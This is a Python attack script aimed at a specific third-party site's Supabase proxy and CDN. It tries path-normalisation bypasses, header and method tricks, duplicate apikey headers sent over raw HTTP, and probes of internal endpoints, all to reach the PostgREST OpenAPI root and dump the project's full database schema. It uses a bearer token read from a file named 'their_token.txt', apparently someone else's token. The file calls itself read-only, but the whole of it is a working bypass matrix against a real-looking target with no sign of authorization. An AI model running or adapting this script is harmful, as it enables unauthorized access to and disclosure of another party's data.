#!/usr/bin/env python3
"""PROPOSAL D — Supabase custom-domain gateway path/key-classification bypass matrix (READ-ONLY).
Goal: reach the PostgREST OpenAPI root (/rest/v1/ or /rest/v1) with a publishable key to dump the
full project schema. All requests are GET/HEAD/OPTIONS, <=2 req/s."""
import ssl, json, time, http.client, http.cookiejar, urllib.request, urllib.error, uuid

CTX = ssl.create_default_context()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
PROXY = "https://onlyfakeai.ru/api/supabase"
CDN = "https://cdn.onlyfakeai.ru"
KEY = "<publishable-key>"
TOK = json.load(open("their_token.txt"))["access_token"]
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=CTX),
                                 urllib.request.HTTPCookieProcessor(cj))
HOSTS = [("proxy", PROXY), ("cdn", CDN)]
HITS = []


def get(tag, base, path, hdrs=None, method="GET"):
    url = base + path
    h = {"User-Agent": UA, "apikey": KEY, "Authorization": "Bearer " + TOK,
         "Accept": "application/openapi+json"}
    h.update(hdrs or {})
    rq = urllib.request.Request(url, headers=h, method=method)
    try:
        with op.open(rq, timeout=20) as x:
            st, hb, b = x.status, dict(x.headers), x.read()
    except urllib.error.HTTPError as e:
        st, hb, b = e.code, dict(e.headers), e.read()
    except Exception as e:
        st, hb, b = 0, {}, str(e).encode()
    t = b.decode("utf-8", "ignore")
    jackpot = any(k in t for k in ('"openapi"', '"swagger"', '"paths"', '"definitions"', '"components"'))
    extra = ""
    if jackpot:
        HITS.append((tag, path, st, t[:200]))
        extra = "  <<< OPENAPI!"
    print(f"  [{tag}] {method} {path[:70]} -> {st} len={len(b)} ct={hb.get('content-type','')[:24]}{extra} :: {t[:110].replace(chr(10),' ')}")
    time.sleep(0.25)


print("== 1) path-normalisation matrix on /rest/v1 root (proxy) ==")
pathens = [
    "rest/v1/", "rest/v1", "rest/v1//", "rest/v1/%2f", "rest/v1%2f", "rest//v1/",
    "//rest/v1/", "rest/v1/./", "rest/v1/%2e", "rest/v1/%2e/", "rest/v1/../rest/v1/",
    "rest/v1/%2e%2e/rest/v1/", "rest/v1/..;/", "rest/v1/;", "rest/v1/%3b", "rest/v1/%20",
    "rest/v1/%00", "rest/v1/%23", "rest/v1/%3f", "rest/v1/index", "REST/v1/", "Rest/v1/",
    "rest/V1/", "rest/v1/./?select=1", "rest/v1/?select=1", "rest/v1/%2e%2e%2f",
]
for p in pathens:
    get("proxy", PROXY, "/" + p)

print("\n== 2) methods / headers on the secret-only root ==")
for m in ("HEAD", "OPTIONS"):
    get("proxy", PROXY, "/rest/v1/", method=m)
get("proxy", PROXY, "/rest/v1/", {"Accept": "application/json"})
get("proxy", PROXY, "/rest/v1/", {"Accept": "text/csv"})
get("proxy", PROXY, "/rest/v1/", {"Accept": "application/vnd.pgrst.object+json"})
get("proxy", PROXY, "/rest/v1/", {"Accept-Profile": "public", "Content-Profile": "public"})
get("proxy", PROXY, "/rest/v1/", {"X-Client-Info": "postgrest-js/2.0.0"})
get("proxy", PROXY, "/rest/v1/", {"x-api-key": KEY})
get("proxy", PROXY, "/rest/v1/", {"x-supabase-api-key": KEY})
get("proxy", PROXY, "/rest/v1/", {"apikey": KEY + " ; sb_secret_probe"})
get("proxy", PROXY, "/rest/v1/?apikey=" + KEY)

print("\n== 3) duplicate apikey headers (raw HTTP, classification confusion) ==")
for tag, hdrs in [
    ("dup publishable+secret", [("apikey", KEY), ("apikey", "sb_secret_probe")]),
    ("dup secret+publishable", [("apikey", "sb_secret_probe"), ("apikey", KEY)]),
    ("dup publishable x2", [("apikey", KEY), ("apikey", KEY)]),
]:
    try:
        c = http.client.HTTPSConnection("onlyfakeai.ru", timeout=20, context=CTX)
        c.putrequest("GET", "/api/supabase/rest/v1/", skip_accept_encoding=True)
        c.putheader("Host", "onlyfakeai.ru")
        c.putheader("User-Agent", UA)
        c.putheader("Authorization", "Bearer " + TOK)
        c.putheader("Accept", "application/json")
        for k, v in hdrs:  # real duplicate header lines
            c.putheader(k, v)
        c.putheader("Connection", "close")
        c.endheaders()
        resp = c.getresponse()
        b = resp.read()
        t = b.decode("utf-8", "ignore")
        print(f"  [{tag}] -> {resp.status} len={len(b)} :: {t[:140].replace(chr(10),' ')}")
        if any(k in t for k in ('"openapi"', '"swagger"', '"paths"')):
            HITS.append((tag, "dup-apikey", resp.status, t[:200]))
        c.close()
    except Exception as e:
        print(f"  [{tag}] err {e}")
    time.sleep(0.4)

print("\n== 4) direct CDN (bypass Next rewrite) for key paths ==")
for p in ["rest/v1/", "rest/v1", "rest/v1/%2f", "REST/v1/", "health", "auth/v1/health",
          "auth/v1/settings", "storage/v1/bucket"]:
    get("cdn", CDN, "/" + p)

print("\n== 5) gateway/other components surface ==")
for p in ["health", "health/", "health?verbose=1", "ready", "metrics", "server_info", "version",
          "admin", "gateway", "_internal", "rest/", "auth/", "storage/", "functions/v1/",
          "functions/v1/", "realtime/v1/", "pg/", "graphql/v1/"]:
    get("proxy", PROXY, "/" + p)

print("\n== HITS ==")
for h in HITS:
    print(h)
if not HITS:
    print("none (no OpenAPI/schema disclosure obtained)")
